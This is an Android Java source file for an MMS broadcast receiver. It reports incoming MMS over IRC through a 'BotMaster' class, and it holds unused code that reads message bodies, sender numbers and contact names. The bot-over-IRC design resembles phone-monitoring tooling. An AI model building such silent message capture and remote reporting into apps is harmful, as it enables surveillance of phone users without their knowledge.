package com.corps.juxo.benjamin.ia;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;


/**
 * Created by Benjamin Adacis on 01/01/2018.
 */



public class MmsReceiver extends BroadcastReceiver {

    private static final String ACTION_MMS_RECEIVED = "android.provider.Telephony.WAP_PUSH_RECEIVED";
    private static final String MMS_DATA_TYPE = "application/vnd.wap.mms-message";
    private Context mContext;
    private Intent mIntent;

    @Override
    public void onReceive(Context context, Intent intent) {
        mContext = context;
        mIntent = intent;
        String action = intent.getAction();
        String type = intent.getType();
        System.out.println("MMS RECU");
        if(action.equals(ACTION_MMS_RECEIVED) && type.equals(MMS_DATA_TYPE)){
            Bundle bundle;
            bundle = intent.getExtras();
            if (bundle != null) {
              //  System.out.println(extractMessage());
            }
            BotMaster.me.sendIRC("Mms reçu");
        }

    }

    public String extractMessage(){
        String address = "";
        String contentSMS = "";
        String phoneNumber = "";
        String NameContact = "";
        //int contactId = -1;

        SmsMessage[] msgs = getMessagesFromIntent(this.mIntent);

        if (msgs != null) {
            //Recherche du contenu du message
            for (int i = 0; i < msgs.length; i++) {
                phoneNumber = msgs[i].getDisplayOriginatingAddress();
                address = msgs[i].getOriginatingAddress();
                contentSMS += msgs[i].getMessageBody().toString();
                contentSMS += " ";
            }

            // Recherche du contact associé
            String contact = new ContactPhone(mContext).getContactNameByPhoneNumber(address);
            if(contact.isEmpty()){
                NameContact = phoneNumber;
            }else{
                NameContact = contact.replace(" ", "-");
            }

        }

        return contentSMS;
    }

    public static SmsMessage[] getMessagesFromIntent(Intent intent) {
        Object[] messages = (Object[]) intent.getSerializableExtra("pdus");
        byte[][] pduObjs = new byte[messages.length][];

        for (int i = 0; i < messages.length; i++) {
            pduObjs[i] = (byte[]) messages[i];
        }
        byte[][] pdus = new byte[pduObjs.length][];
        int pduCount = pdus.length;
        SmsMessage[] msgs = new SmsMessage[pduCount];
        for (int i = 0; i < pduCount; i++) {
            pdus[i] = pduObjs[i];
            msgs[i] = SmsMessage.createFromPdu(pdus[i]);
        }
        return msgs;
    }
}
